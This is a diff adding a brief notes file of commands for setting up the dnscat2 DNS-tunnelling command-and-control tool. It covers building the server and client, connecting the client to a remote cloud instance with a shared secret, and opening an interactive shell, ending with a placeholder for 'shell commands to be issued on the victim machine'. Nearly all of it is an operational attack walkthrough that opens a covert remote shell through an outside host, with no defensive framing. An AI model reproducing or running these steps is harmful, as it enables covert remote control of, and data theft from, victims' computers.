@@ -1,0 +1,36 @@
+***********Setting up the dnscat2 server***********
+
+su
+apt-get update
+apt-get install ruby-dev
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server
+apt-get install gcc maker
+gem install bundler
+bundle install
+
+***********Testing the dnscat2 server***********
+
+sudo ruby ./dnscat2.rb
+
+***********Compiling the client***********
+
+sudo git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client
+cd /opt/dnscat2/client/
+make
+
+***********Running dnscat2 server***********
+
+sudo ruby ./dnscat2 --secret=somerand0mstring
+
+***********Connecting to dnscat2 server***********
+
+sudo ./dnscat --secret=somerand0mstring --dns=server=<AWC Instance IP address>
+
+***********Commands to interact with remote shell***********
+
+window -i 1
+shell
+Ctrl+z
+window -i 2
+<shell commands to be issued on the victim machine>
